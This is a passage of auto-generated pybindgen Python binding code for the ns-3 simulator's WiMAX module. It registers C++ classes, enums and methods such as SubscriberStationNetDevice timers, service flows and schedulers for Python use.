[param('ns3::Time', 'BlockTime'), param('uint32_t', 'burstSize'), param('ns3::Ptr< ns3::WimaxPhy >', 'phy'), param('bool', 'isFirstBlock'), param('bool', 'isLastBlock'), param('uint64_t', 'frequency'), param('ns3::WimaxPhy::ModulationType', 'modulationType'), param('uint8_t', 'direction'), param('double', 'txPowerDbm'), param('ns3::Ptr< ns3::PacketBurst >', 'burst')])
cls.add_method('SetPropagationModel',
'void',
[param('ns3::SimpleOfdmWimaxChannel::PropModel', 'propModel')])
cls.add_method('DoAttach',
'void',
[param('ns3::Ptr< ns3::WimaxPhy >', 'phy')],
visibility='private', is_virtual=True)
cls.add_method('DoGetDevice',
'ns3::Ptr< ns3::NetDevice >',
[param('uint32_t', 'i')],
is_const=True, visibility='private', is_virtual=True)
cls.add_method('DoGetNDevices',
'uint32_t',
[],
is_const=True, visibility='private', is_virtual=True)
return
def register_Ns3SubscriberStationNetDevice_methods(root_module, cls):
cls.add_instance_attribute('m_linkManager', 'ns3::Ptr< ns3::SSLinkManager >', is_const=False)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_constructor([])
cls.add_constructor([param('ns3::Ptr< ns3::Node >', 'arg0'), param('ns3::Ptr< ns3::WimaxPhy >', 'arg1')])
cls.add_method('InitSubscriberStationNetDevice',
'void',
[])
cls.add_method('SetLostDlMapInterval',
'void',
[param('ns3::Time', 'lostDlMapInterval')])
cls.add_method('GetLostDlMapInterval',
'ns3::Time',
[],
is_const=True)
cls.add_method('SetLostUlMapInterval',
'void',
[param('ns3::Time', 'lostUlMapInterval')])
cls.add_method('GetLostUlMapInterval',
'ns3::Time',
[],
is_const=True)
cls.add_method('SetMaxDcdInterval',
'void',
[param('ns3::Time', 'maxDcdInterval')])
cls.add_method('GetMaxDcdInterval',
'ns3::Time',
[],
is_const=True)
cls.add_method('SetMaxUcdInterval',
'void',
[param('ns3::Time', 'maxUcdInterval')])
cls.add_method('GetMaxUcdInterval',
'ns3::Time',
[],
is_const=True)
cls.add_method('SetIntervalT1',
'void',
[param('ns3::Time', 'interval1')])
cls.add_method('GetIntervalT1',
'ns3::Time',
[],
is_const=True)
cls.add_method('SetIntervalT2',
'void',
[param('ns3::Time', 'interval2')])
cls.add_method('GetIntervalT2',
'ns3::Time',
[],
is_const=True)
cls.add_method('SetIntervalT3',
'void',
[param('ns3::Time', 'interval3')])
cls.add_method('GetIntervalT3',
'ns3::Time',
[],
is_const=True)
cls.add_method('SetIntervalT7',
'void',
[param('ns3::Time', 'interval7')])
cls.add_method('GetIntervalT7',
'ns3::Time',
[],
is_const=True)
cls.add_method('SetIntervalT12',
'void',
[param('ns3::Time', 'interval12')])
cls.add_method('GetIntervalT12',
'ns3::Time',
[],
is_const=True)
cls.add_method('SetIntervalT20',
'void',
[param('ns3::Time', 'interval20')])
cls.add_method('GetIntervalT20',
'ns3::Time',
[],
is_const=True)
cls.add_method('SetIntervalT21',
'void',
[param('ns3::Time', 'interval21')])
cls.add_method('GetIntervalT21',
'ns3::Time',
[],
is_const=True)
cls.add_method('SetMaxContentionRangingRetries',
'void',
[param('uint8_t', 'maxContentionRangingRetries')])
cls.add_method('GetMaxContentionRangingRetries',
'uint8_t',
[],
is_const=True)
cls.add_method('SetBasicConnection',
'void',
[param('ns3::Ptr< ns3::WimaxConnection >', 'basicConnection')])
cls.add_method('GetBasicConnection',
'ns3::Ptr< ns3::WimaxConnection >',
[],
is_const=True)
cls.add_method('SetPrimaryConnection',
'void',
[param('ns3::Ptr< ns3::WimaxConnection >', 'primaryConnection')])
cls.add_method('GetPrimaryConnection',
'ns3::Ptr< ns3::WimaxConnection >',
[],
is_const=True)
cls.add_method('GetBasicCid',
'ns3::Cid',
[],
is_const=True)
cls.add_method('GetPrimaryCid',
'ns3::Cid',
[],
is_const=True)
cls.add_method('SetModulationType',
'void',
[param('ns3::WimaxPhy::ModulationType', 'modulationType')])
cls.add_method('GetModulationType',
'ns3::WimaxPhy::ModulationType',
[],
is_const=True)
cls.add_method('SetAreManagementConnectionsAllocated',
'void',
[param('bool', 'areManagementConnectionsAllocated')])
cls.add_method('GetAreManagementConnectionsAllocated',
'bool',
[],
is_const=True)
cls.add_method('SetAreServiceFlowsAllocated',
'void',
[param('bool', 'areServiceFlowsAllocated')])
cls.add_method('GetAreServiceFlowsAllocated',
'bool',
[],
is_const=True)
cls.add_method('GetScheduler',
'ns3::Ptr< ns3::SSScheduler >',
[],
is_const=True)
cls.add_method('SetScheduler',
'void',
[param('ns3::Ptr< ns3::SSScheduler >', 'ssScheduler')])
cls.add_method('HasServiceFlows',
'bool',
[],
is_const=True)
cls.add_method('Enqueue',
'bool',
[param('ns3::Ptr< ns3::Packet >', 'packet'), param('ns3::MacHeaderType const &', 'hdrType'), param('ns3::Ptr< ns3::WimaxConnection >', 'connection')],
is_virtual=True)
cls.add_method('SendBurst',
'void',
[param('uint8_t', 'uiuc'), param('uint16_t', 'nrSymbols'), param('ns3::Ptr< ns3::WimaxConnection >', 'connection'), param('ns3::MacHeaderType::HeaderType', 'packetType', default_value='::ns3::MacHeaderType::HEADER_TYPE_GENERIC')])
cls.add_method('Start',
'void',
[],
is_virtual=True)
cls.add_method('Stop',
'void',
[],
is_virtual=True)
cls.add_method('AddServiceFlow',
'void',
[param('ns3::ServiceFlow *', 'sf')])
cls.add_method('AddServiceFlow',
'void',
[param('ns3::ServiceFlow', 'sf')])
cls.add_method('SetTimer',
'void',
[param('ns3::EventId', 'eventId'), param('ns3::EventId &', 'event')])
cls.add_method('IsRegistered',
'bool',
[],
is_const=True)
cls.add_method('GetTimeToAllocation',
'ns3::Time',
[param('ns3::Time', 'defferTime')])
cls.add_method('GetIpcsClassifier',
'ns3::Ptr< ns3::IpcsClassifier >',
[],
is_const=True)
cls.add_method('SetIpcsPacketClassifier',
'void',
[param('ns3::Ptr< ns3::IpcsClassifier >', 'arg0')])
cls.add_method('GetLinkManager',
'ns3::Ptr< ns3::SSLinkManager >',
[],
is_const=True)
cls.add_method('SetLinkManager',
'void',
[param('ns3::Ptr< ns3::SSLinkManager >', 'arg0')])
cls.add_method('GetServiceFlowManager',
'ns3::Ptr< ns3::SsServiceFlowManager >',
[],
is_const=True)
cls.add_method('SetServiceFlowManager',
'void',
[param('ns3::Ptr< ns3::SsServiceFlowManager >', 'arg0')])
cls.add_method('DoDispose',
'void',
[],
visibility='private', is_virtual=True)
cls.add_method('DoSend',
'bool',
[param('ns3::Ptr< ns3::Packet >', 'packet'), param('ns3::Mac48Address const &', 'source'), param('ns3::Mac48Address const &', 'dest'), param('uint16_t', 'protocolNumber')],
visibility='private', is_virtual=True)
cls.add_method('DoReceive',
'void',
[param('ns3::Ptr< ns3::Packet >', 'packet')],
visibility='private', is_virtual=True)
return
def register_functions(root_module):
module = root_module
module.add_function('CRC8Calculate',
'uint8_t',
[param('uint8_t const *', 'data'), param('int', 'length')])
register_functions_ns3_FatalImpl(module.get_submodule('FatalImpl'), root_module)
register_functions_ns3_internal(module.get_submodule('internal'), root_module)
return
def register_functions_ns3_FatalImpl(module, root_module):
return
def register_functions_ns3_internal(module, root_module):
return
def main():
out = FileCodeSink(sys.stdout)
root_module = module_init()
register_types(root_module)
register_methods(root_module)
register_functions(root_module)
root_module.generate(out)
if __name__ == '__main__':
main()
from pybindgen import Module, FileCodeSink, param, retval, cppclass, typehandlers
import pybindgen.settings
import warnings
class ErrorHandler(pybindgen.settings.ErrorHandler):
def handle_error(self, wrapper, exception, traceback_):
warnings.warn("exception %r in wrapper %s" % (exception, wrapper))
return True
pybindgen.settings.error_handler = ErrorHandler()
import sys
def module_init():
root_module = Module('ns.wimax', cpp_namespace='::ns3')
return root_module
def register_types(module):
root_module = module.get_root()
module.add_enum('ReqType', ['DATA', 'UNICAST_POLLING'])
module.add_enum('LogLevel', ['LOG_NONE', 'LOG_ERROR', 'LOG_LEVEL_ERROR', 'LOG_WARN', 'LOG_LEVEL_WARN', 'LOG_DEBUG', 'LOG_LEVEL_DEBUG', 'LOG_INFO', 'LOG_LEVEL_INFO', 'LOG_FUNCTION', 'LOG_LEVEL_FUNCTION', 'LOG_LOGIC', 'LOG_LEVEL_LOGIC', 'LOG_ALL', 'LOG_LEVEL_ALL', 'LOG_PREFIX_FUNC', 'LOG_PREFIX_TIME', 'LOG_PREFIX_NODE'], import_from_module='ns.core')
module.add_class('Address', import_from_module='ns.network')
module.add_enum('MaxSize_e', ['MAX_SIZE'], outer_class=root_module['ns3::Address'], import_from_module='ns.network')
module.add_class('AsciiTraceHelper', import_from_module='ns.network')
module.add_class('AsciiTraceHelperForDevice', allow_subclassing=True, import_from_module='ns.network')
module.add_class('AttributeConstructionList', import_from_module='ns.core')
module.add_class('Item', import_from_module='ns.core', outer_class=root_module['ns3::AttributeConstructionList'])
module.add_class('Buffer', import_from_module='ns.network')
module.add_class('Iterator', import_from_module='ns.network', outer_class=root_module['ns3::Buffer'])
module.add_class('ByteTagIterator', import_from_module='ns.network')
module.add_class('Item', import_from_module='ns.network', outer_class=root_module['ns3::ByteTagIterator'])
module.add_class('ByteTagList', import_from_module='ns.network')
module.add_class('Iterator', import_from_module='ns.network', outer_class=root_module['ns3::ByteTagList'])
module.add_class('Item', import_from_module='ns.network', outer_class=root_module['ns3::ByteTagList::Iterator'])
module.add_class('CallbackBase', import_from_module='ns.core')
module.add_class('Cid')
module.add_enum('Type', ['BROADCAST', 'INITIAL_RANGING', 'BASIC', 'PRIMARY', 'TRANSPORT', 'MULTICAST', 'PADDING'], outer_class=root_module['ns3::Cid'])
module.add_class('CidFactory')
module.add_class('CsParameters')
module.add_enum('Action', ['ADD', 'REPLACE', 'DELETE'], outer_class=root_module['ns3::CsParameters'])
module.add_class('DcdChannelEncodings', allow_subclassing=True)
module.add_class('DlFramePrefixIe')
module.add_class('EventId', import_from_module='ns.core')
module.add_class('IpcsClassifierRecord')
module.add_class('Ipv4Address', import_from_module='ns.network')
root_module['ns3::Ipv4Address'].implicitly_converts_to(root_module['ns3::Address'])
module.add_class('Ipv4Mask', import_from_module='ns.network')
module.add_class('Ipv6Address', import_from_module='ns.network')
root_module['ns3::Ipv6Address'].implicitly_converts_to(root_module['ns3::Address'])
module.add_class('Ipv6Prefix', import_from_module='ns.network')
module.add_class('LogComponent', import_from_module='ns.core')
module.add_class('Mac48Address', import_from_module='ns.network')
root_module['ns3::Mac48Address'].implicitly_converts_to(root_module['ns3::Address'])
module.add_class('NetDeviceContainer', import_from_module='ns.network')
module.add_class('NodeContainer', import_from_module='ns.network')
module.add_class('ObjectBase', allow_subclassing=True, import_from_module='ns.core')
module.add_class('ObjectDeleter', import_from_module='ns.core')
module.add_class('ObjectFactory', import_from_module='ns.core')
module.add_class('OfdmDcdChannelEncodings', parent=root_module['ns3::DcdChannelEncodings'])
module.add_class('OfdmDlBurstProfile')
module.add_enum('Diuc', ['DIUC_STC_ZONE', 'DIUC_BURST_PROFILE_1', 'DIUC_BURST_PROFILE_2', 'DIUC_BURST_PROFILE_3', 'DIUC_BURST_PROFILE_4', 'DIUC_BURST_PROFILE_5', 'DIUC_BURST_PROFILE_6', 'DIUC_BURST_PROFILE_7', 'DIUC_BURST_PROFILE_8', 'DIUC_BURST_PROFILE_9', 'DIUC_BURST_PROFILE_10', 'DIUC_BURST_PROFILE_11', 'DIUC_GAP', 'DIUC_END_OF_MAP'], outer_class=root_module['ns3::OfdmDlBurstProfile'])
module.add_class('OfdmDlMapIe')
module.add_class('OfdmUlBurstProfile')
module.add_enum('Uiuc', ['UIUC_INITIAL_RANGING', 'UIUC_REQ_REGION_FULL', 'UIUC_REQ_REGION_FOCUSED', 'UIUC_FOCUSED_CONTENTION_IE', 'UIUC_BURST_PROFILE_5', 'UIUC_BURST_PROFILE_6', 'UIUC_BURST_PROFILE_7', 'UIUC_BURST_PROFILE_8', 'UIUC_BURST_PROFILE_9', 'UIUC_BURST_PROFILE_10', 'UIUC_BURST_PROFILE_11', 'UIUC_BURST_PROFILE_12', 'UIUC_SUBCH_NETWORK_ENTRY', 'UIUC_END_OF_MAP'], outer_class=root_module['ns3::OfdmUlBurstProfile'])
module.add_class('OfdmUlMapIe')
module.add_class('PacketMetadata', import_from_module='ns.network')
module.add_class('Item', import_from_module='ns.network', outer_class=root_module['ns3::PacketMetadata'])
module.add_enum('', ['PAYLOAD', 'HEADER', 'TRAILER'], outer_class=root_module['ns3::PacketMetadata::Item'], import_from_module='ns.network')
module.add_class('ItemIterator', import_from_module='ns.network', outer_class=root_module['ns3::PacketMetadata'])
module.add_class('PacketTagIterator', import_from_module='ns.network')
module.add_class('Item', import_from_module='ns.network', outer_class=root_module['ns3::PacketTagIterator'])
module.add_class('PacketTagList', import_from_module='ns.network')
module.add_class('TagData', import_from_module='ns.network', outer_class=root_module['ns3::PacketTagList'])
module.add_class('PcapFile', import_from_module='ns.network')
module.add_class('PcapHelper', import_from_module='ns.network')
module.add_enum('', ['DLT_NULL', 'DLT_EN10MB', 'DLT_PPP', 'DLT_RAW', 'DLT_IEEE802_11', 'DLT_PRISM_HEADER', 'DLT_IEEE802_11_RADIO'], outer_class=root_module['ns3::PcapHelper'], import_from_module='ns.network')
module.add_class('PcapHelperForDevice', allow_subclassing=True, import_from_module='ns.network')
module.add_class('RandomVariable', import_from_module='ns.core')
module.add_class('SNRToBlockErrorRateManager')
module.add_class('SNRToBlockErrorRateRecord')
module.add_class('SSRecord')
module.add_class('SeedManager', import_from_module='ns.core')
module.add_class('SendParams')
module.add_class('SequentialVariable', import_from_module='ns.core', parent=root_module['ns3::RandomVariable'])
module.add_class('ServiceFlow')
module.add_enum('Direction', ['SF_DIRECTION_DOWN', 'SF_DIRECTION_UP'], outer_class=root_module['ns3::ServiceFlow'])
module.add_enum('Type', ['SF_TYPE_PROVISIONED', 'SF_TYPE_ADMITTED', 'SF_TYPE_ACTIVE'], outer_class=root_module['ns3::ServiceFlow'])
module.add_enum('SchedulingType', ['SF_TYPE_NONE', 'SF_TYPE_UNDEF', 'SF_TYPE_BE', 'SF_TYPE_NRTPS', 'SF_TYPE_RTPS', 'SF_TYPE_UGS', 'SF_TYPE_ALL'], outer_class=root_module['ns3::ServiceFlow'])
module.add_enum('CsSpecification', ['ATM', 'IPV4', 'IPV6', 'ETHERNET', 'VLAN', 'IPV4_OVER_ETHERNET', 'IPV6_OVER_ETHERNET', 'IPV4_OVER_VLAN', 'IPV6_OVER_VLAN'], outer_class=root_module['ns3::ServiceFlow'])
module.add_enum('ModulationType', ['MODULATION_TYPE_BPSK_12', 'MODULATION_TYPE_QPSK_12', 'MODULATION_TYPE_QPSK_34', 'MODULATION_TYPE_QAM16_12', 'MODULATION_TYPE_QAM16_34', 'MODULATION_TYPE_QAM64_23', 'MODULATION_TYPE_QAM64_34'], outer_class=root_module['ns3::ServiceFlow'])
module.add_class('ServiceFlowRecord')
module.add_class('SimpleRefCount', automatic_type_narrowing=True, import_from_module='ns.core', template_parameters=['ns3::Object', 'ns3::ObjectBase', 'ns3::ObjectDeleter'], parent=root_module['ns3::ObjectBase'], memory_policy=cppclass.ReferenceCountingMethodsPolicy(incref_method='Ref', decref_method='Unref', peekref_method='GetReferenceCount'))
module.add_class('Simulator', destructor_visibility='private', import_from_module='ns.core')
module.add_class('Tag', import_from_module='ns.network', parent=root_module['ns3::ObjectBase'])
module.add_class('TagBuffer', import_from_module='ns.network')
module.add_class('TlvValue', allow_subclassing=True)
module.add_class('TosTlvValue', parent=root_module['ns3::TlvValue'])
module.add_class('TriangularVariable', import_from_module='ns.core', parent=root_module['ns3::RandomVariable'])
module.add_class('TypeId', import_from_module='ns.core')
module.add_enum('AttributeFlag', ['ATTR_GET', 'ATTR_SET', 'ATTR_CONSTRUCT', 'ATTR_SGC'], outer_class=root_module['ns3::TypeId'], import_from_module='ns.core')
module.add_class('AttributeInformation', import_from_module='ns.core', outer_class=root_module['ns3::TypeId'])
module.add_class('TraceSourceInformation', import_from_module='ns.core', outer_class=root_module['ns3::TypeId'])
module.add_class('U16TlvValue', parent=root_module['ns3::TlvValue'])
module.add_class('U32TlvValue', parent=root_module['ns3::TlvValue'])
module.add_class('U8TlvValue', parent=root_module['ns3::TlvValue'])
module.add_class('UcdChannelEncodings', allow_subclassing=True)
module.add_class('UniformVariable', import_from_module='ns.core', parent=root_module['ns3::RandomVariable'])
module.add_class('VectorTlvValue', parent=root_module['ns3::TlvValue'])
module.add_class('WeibullVariable', import_from_module='ns.core', parent=root_module['ns3::RandomVariable'])
module.add_class('WimaxHelper', parent=[root_module['ns3::PcapHelperForDevice'], root_module['ns3::AsciiTraceHelperForDevice']])
module.add_enum('NetDeviceType', ['DEVICE_TYPE_SUBSCRIBER_STATION', 'DEVICE_TYPE_BASE_STATION'], outer_class=root_module['ns3::WimaxHelper'])
module.add_enum('PhyType', ['SIMPLE_PHY_TYPE_OFDM'], outer_class=root_module['ns3::WimaxHelper'])
module.add_enum('SchedulerType', ['SCHED_TYPE_SIMPLE', 'SCHED_TYPE_RTPS', 'SCHED_TYPE_MBQOS'], outer_class=root_module['ns3::WimaxHelper'])
module.add_class('ZetaVariable', import_from_module='ns.core', parent=root_module['ns3::RandomVariable'])
module.add_class('ZipfVariable', import_from_module='ns.core', parent=root_module['ns3::RandomVariable'])
module.add_class('empty', import_from_module='ns.core')
module.add_class('int64x64_t', import_from_module='ns.core')
module.add_class('simpleOfdmSendParam')
module.add_class('Chunk', import_from_module='ns.network', parent=root_module['ns3::ObjectBase'])
module.add_class('ClassificationRuleVectorTlvValue', parent=root_module['ns3::VectorTlvValue'])
module.add_enum('ClassificationRuleTlvType', ['Priority', 'ToS', 'Protocol', 'IP_src', 'IP_dst', 'Port_src', 'Port_dst', 'Index'], outer_class=root_module['ns3::ClassificationRuleVectorTlvValue'])
module.add_class('ConstantVariable', import_from_module='ns.core', parent=root_module['ns3::RandomVariable'])
module.add_class('CsParamVectorTlvValue', parent=root_module['ns3::VectorTlvValue'])
module.add_enum('Type', ['Classifier_DSC_Action', 'Packet_Classification_Rule'], outer_class=root_module['ns3::CsParamVectorTlvValue'])
module.add_class('DeterministicVariable', import_from_module='ns.core', parent=root_module['ns3::RandomVariable'])
module.add_class('EmpiricalVariable', import_from_module='ns.core', parent=root_module['ns3::RandomVariable'])
module.add_class('ErlangVariable', import_from_module='ns.core', parent=root_module['ns3::RandomVariable'])
module.add_class('ExponentialVariable', import_from_module='ns.core', parent=root_module['ns3::RandomVariable'])
module.add_class('GammaVariable', import_from_module='ns.core', parent=root_module['ns3::RandomVariable'])
module.add_class('Header', import_from_module='ns.network', parent=root_module['ns3::Chunk'])
module.add_class('IntEmpiricalVariable', import_from_module='ns.core', parent=root_module['ns3::EmpiricalVariable'])
module.add_class('Ipv4AddressTlvValue', parent=root_module['ns3::TlvValue'])
module.add_class('ipv4Addr', outer_class=root_module['ns3::Ipv4AddressTlvValue'])
module.add_class('LogNormalVariable', import_from_module='ns.core', parent=root_module['ns3::RandomVariable'])
module.add_class('MacHeaderType', parent=root_module['ns3::Header'])
module.add_enum('HeaderType', ['HEADER_TYPE_GENERIC', 'HEADER_TYPE_BANDWIDTH'], outer_class=root_module['ns3::MacHeaderType'])
module.add_class('ManagementMessageType', parent=root_module['ns3::Header'])
module.add_enum('MessageType', ['MESSAGE_TYPE_UCD', 'MESSAGE_TYPE_DCD', 'MESSAGE_TYPE_DL_MAP', 'MESSAGE_TYPE_UL_MAP', 'MESSAGE_TYPE_RNG_REQ', 'MESSAGE_TYPE_RNG_RSP', 'MESSAGE_TYPE_REG_REQ', 'MESSAGE_TYPE_REG_RSP', 'MESSAGE_TYPE_DSA_REQ', 'MESSAGE_TYPE_DSA_RSP', 'MESSAGE_TYPE_DSA_ACK'], outer_class=root_module['ns3::ManagementMessageType'])
module.add_class('NormalVariable', import_from_module='ns.core', parent=root_module['ns3::RandomVariable'])
module.add_class('Object', import_from_module='ns.core', parent=root_module['ns3::SimpleRefCount< ns3::Object, ns3::ObjectBase, ns3::ObjectDeleter >'])
module.add_class('AggregateIterator', import_from_module='ns.core', outer_class=root_module['ns3::Object'])
module.add_class('OfdmDownlinkFramePrefix', parent=root_module['ns3::Header'])
module.add_class('OfdmSendParams', parent=root_module['ns3::SendParams'])
module.add_class('OfdmUcdChannelEncodings', parent=root_module['ns3::UcdChannelEncodings'])
module.add_class('PacketBurst', import_from_module='ns.network', parent=root_module['ns3::Object'])
module.add_class('ParetoVariable', import_from_module='ns.core', parent=root_module['ns3::RandomVariable'])
module.add_class('PcapFileWrapper', import_from_module='ns.network', parent=root_module['ns3::Object'])
module.add_class('PortRangeTlvValue', parent=root_module['ns3::TlvValue'])
module.add_class('PortRange', outer_class=root_module['ns3::PortRangeTlvValue'])
module.add_class('PriorityUlJob', parent=root_module['ns3::Object'])
module.add_class('PropagationLossModel', import_from_module='ns.propagation', parent=root_module['ns3::Object'])
module.add_class('ProtocolTlvValue', parent=root_module['ns3::TlvValue'])
module.add_class('RandomPropagationLossModel', import_from_module='ns.propagation', parent=root_module['ns3::PropagationLossModel'])
module.add_class('RangePropagationLossModel', import_from_module='ns.propagation', parent=root_module['ns3::PropagationLossModel'])
module.add_class('RngReq', parent=root_module['ns3::Header'])
module.add_class('RngRsp', parent=root_module['ns3::Header'])
module.add_class('SSManager', parent=root_module['ns3::Object'])
module.add_class('ServiceFlowManager', parent=root_module['ns3::Object'])
module.add_enum('ConfirmationCode', ['CONFIRMATION_CODE_SUCCESS', 'CONFIRMATION_CODE_REJECT'], outer_class=root_module['ns3::ServiceFlowManager'])
module.add_class('SfVectorTlvValue', parent=root_module['ns3::VectorTlvValue'])
module.add_enum('Type', ['SFID', 'CID', 'Service_Class_Name', 'reserved1', 'QoS_Parameter_Set_Type', 'Traffic_Priority', 'Maximum_Sustained_Traffic_Rate', 'Maximum_Traffic_Burst', 'Minimum_Reserved_Traffic_Rate', 'Minimum_Tolerable_Traffic_Rate', 'Service_Flow_Scheduling_Type', 'Request_Transmission_Policy', 'Tolerated_Jitter', 'Maximum_Latency', 'Fixed_length_versus_Variable_length_SDU_Indicator', 'SDU_Size', 'Target_SAID', 'ARQ_Enable', 'ARQ_WINDOW_SIZE', 'ARQ_RETRY_TIMEOUT_Transmitter_Delay', 'ARQ_RETRY_TIMEOUT_Receiver_Delay', 'ARQ_BLOCK_LIFETIME', 'ARQ_SYNC_LOSS', 'ARQ_DELIVER_IN_ORDER', 'ARQ_PURGE_TIMEOUT', 'ARQ_BLOCK_SIZE', 'reserved2', 'CS_Specification', 'IPV4_CS_Parameters'], outer_class=root_module['ns3::SfVectorTlvValue'])
module.add_class('SimpleRefCount', automatic_type_narrowing=True, import_from_module='ns.core', template_parameters=['ns3::AttributeAccessor', 'ns3::empty', 'ns3::DefaultDeleter<ns3::AttributeAccessor>'], parent=root_module['ns3::empty'], memory_policy=cppclass.ReferenceCountingMethodsPolicy(incref_method='Ref', decref_method='Unref', peekref_method='GetReferenceCount'))
module.add_class('SimpleRefCount', automatic_type_narrowing=True, import_from_module='ns.core', template_parameters=['ns3::AttributeChecker', 'ns3::empty', 'ns3::DefaultDeleter<ns3::AttributeChecker>'], parent=root_module['ns3::empty'], memory_policy=cppclass.ReferenceCountingMethodsPolicy(incref_method='Ref', decref_method='Unref', peekref_method='GetReferenceCount'))
module.add_class('SimpleRefCount', automatic_type_narrowing=True, import_from_module='ns.core', template_parameters=['ns3::AttributeValue', 'ns3::empty', 'ns3::DefaultDeleter<ns3::AttributeValue>'], parent=root_module['ns3::empty'], memory_policy=cppclass.ReferenceCountingMethodsPolicy(incref_method='Ref', decref_method='Unref', peekref_method='GetReferenceCount'))
module.add_class('SimpleRefCount', automatic_type_narrowing=True, import_from_module='ns.core', template_parameters=['ns3::CallbackImplBase', 'ns3::empty', 'ns3::DefaultDeleter<ns3::CallbackImplBase>'], parent=root_module['ns3::empty'], memory_policy=cppclass.ReferenceCountingMethodsPolicy(incref_method='Ref', decref_method='Unref', peekref_method='GetReferenceCount'))
module.add_class('SimpleRefCount', automatic_type_narrowing=True, import_from_module='ns.core', template_parameters=['ns3::EventImpl', 'ns3::empty', 'ns3::DefaultDeleter<ns3::EventImpl>'], parent=root_module['ns3::empty'], memory_policy=cppclass.ReferenceCountingMethodsPolicy(incref_method='Ref', decref_method='Unref', peekref_method='GetReferenceCount'))
module.add_class('SimpleRefCount', automatic_type_narrowing=True, import_from_module='ns.core', template_parameters=['ns3::NixVector', 'ns3::empty', 'ns3::DefaultDeleter<ns3::NixVector>'], parent=root_module['ns3::empty'], memory_policy=cppclass.ReferenceCountingMethodsPolicy(incref_method='Ref', decref_method='Unref', peekref_method='GetReferenceCount'))
module.add_class('SimpleRefCount', automatic_type_narrowing=True, import_from_module='ns.core', template_parameters=['ns3::OutputStreamWrapper', 'ns3::empty', 'ns3::DefaultDeleter<ns3::OutputStreamWrapper>'], parent=root_module['ns3::empty'], memory_policy=cppclass.ReferenceCountingMethodsPolicy(incref_method='Ref', decref_method='Unref', peekref_method='GetReferenceCount'))
module.add_class('SimpleRefCount', automatic_type_narrowing=True, import_from_module='ns.core', template_parameters=['ns3::Packet', 'ns3::empty', 'ns3::DefaultDeleter<ns3::Packet>'], parent=root_module['ns3::empty'], memory_policy=cppclass.ReferenceCountingMethodsPolicy(incref_method='Ref', decref_method='Unref', peekref_method='GetReferenceCount'))
module.add_class('SimpleRefCount', automatic_type_narrowing=True, import_from_module='ns.core', template_parameters=['ns3::TraceSourceAccessor', 'ns3::empty', 'ns3::DefaultDeleter<ns3::TraceSourceAccessor>'], parent=root_module['ns3::empty'], memory_policy=cppclass.ReferenceCountingMethodsPolicy(incref_method='Ref', decref_method='Unref', peekref_method='GetReferenceCount'))
module.add_class('SsServiceFlowManager', parent=root_module['ns3::ServiceFlowManager'])
module.add_enum('ConfirmationCode', ['CONFIRMATION_CODE_SUCCESS', 'CONFIRMATION_CODE_REJECT'], outer_class=root_module['ns3::SsServiceFlowManager'])
module.add_class('ThreeLogDistancePropagationLossModel', import_from_module='ns.propagation', parent=root_module['ns3::PropagationLossModel'])
module.add_class('Time', import_from_module='ns.core')
module.add_enum('Unit', ['S', 'MS', 'US', 'NS', 'PS', 'FS', 'LAST'], outer_class=root_module['ns3::Time'], import_from_module='ns.core')
root_module['ns3::Time'].implicitly_converts_to(root_module['ns3::int64x64_t'])
module.add_class('Tlv', parent=root_module['ns3::Header'])
module.add_enum('CommonTypes', ['HMAC_TUPLE', 'MAC_VERSION_ENCODING', 'CURRENT_TRANSMIT_POWER', 'DOWNLINK_SERVICE_FLOW', 'UPLINK_SERVICE_FLOW', 'VENDOR_ID_EMCODING', 'VENDOR_SPECIFIC_INFORMATION'], outer_class=root_module['ns3::Tlv'])
module.add_class('TraceSourceAccessor', import_from_module='ns.core', parent=root_module['ns3::SimpleRefCount< ns3::TraceSourceAccessor, ns3::empty, ns3::DefaultDeleter<ns3::TraceSourceAccessor> >'])
module.add_class('Trailer', import_from_module='ns.network', parent=root_module['ns3::Chunk'])
module.add_class('TwoRayGroundPropagationLossModel', import_from_module='ns.propagation', parent=root_module['ns3::PropagationLossModel'])
module.add_class('Ucd', parent=root_module['ns3::Header'])
module.add_class('UlJob', parent=root_module['ns3::Object'])
module.add_enum('JobPriority', ['LOW', 'INTERMEDIATE', 'HIGH'], outer_class=root_module['ns3::UlJob'])
module.add_class('UlMap', parent=root_module['ns3::Header'])
module.add_class('UplinkScheduler', parent=root_module['ns3::Object'])
module.add_class('UplinkSchedulerMBQoS', parent=root_module['ns3::UplinkScheduler'])
module.add_class('UplinkSchedulerRtps', parent=root_module['ns3::UplinkScheduler'])
module.add_class('UplinkSchedulerSimple', parent=root_module['ns3::UplinkScheduler'])
module.add_class('WimaxConnection', parent=root_module['ns3::Object'])
module.add_class('WimaxMacQueue', parent=root_module['ns3::Object'])
module.add_class('WimaxMacToMacHeader', parent=root_module['ns3::Header'])
module.add_class('WimaxPhy', parent=root_module['ns3::Object'])
module.add_enum('ModulationType', ['MODULATION_TYPE_BPSK_12', 'MODULATION_TYPE_QPSK_12', 'MODULATION_TYPE_QPSK_34', 'MODULATION_TYPE_QAM16_12', 'MODULATION_TYPE_QAM16_34', 'MODULATION_TYPE_QAM64_23', 'MODULATION_TYPE_QAM64_34'], outer_class=root_module['ns3::WimaxPhy'])
module.add_enum('PhyState', ['PHY_STATE_IDLE', 'PHY_STATE_SCANNING', 'PHY_STATE_TX', 'PHY_STATE_RX'], outer_class=root_module['ns3::WimaxPhy'])
module.add_enum('PhyType', ['SimpleWimaxPhy', 'simpleOfdmWimaxPhy'], outer_class=root_module['ns3::WimaxPhy'])
module.add_class('AttributeAccessor', import_from_module='ns.core', parent=root_module['ns3::SimpleRefCount< ns3::AttributeAccessor, ns3::empty, ns3::DefaultDeleter<ns3::AttributeAccessor> >'])
module.add_class('AttributeChecker', allow_subclassing=False, automatic_type_narrowing=True, import_from_module='ns.core', parent=root_module['ns3::SimpleRefCount< ns3::AttributeChecker, ns3::empty, ns3::DefaultDeleter<ns3::AttributeChecker> >'])
module.add_class('AttributeValue', allow_subclassing=False, automatic_type_narrowing=True, import_from_module='ns.core', parent=root_module['ns3::SimpleRefCount< ns3::AttributeValue, ns3::empty, ns3::DefaultDeleter<ns3::AttributeValue> >'])
module.add_class('BSScheduler', parent=root_module['ns3::Object'])
module.add_class('BSSchedulerRtps', parent=root_module['ns3::BSScheduler'])
module.add_class('BSSchedulerSimple', parent=root_module['ns3::BSScheduler'])
module.add_class('BandwidthRequestHeader', parent=root_module['ns3::Header'])
module.add_enum('HeaderType', ['HEADER_TYPE_INCREMENTAL', 'HEADER_TYPE_AGGREGATE'], outer_class=root_module['ns3::BandwidthRequestHeader'])
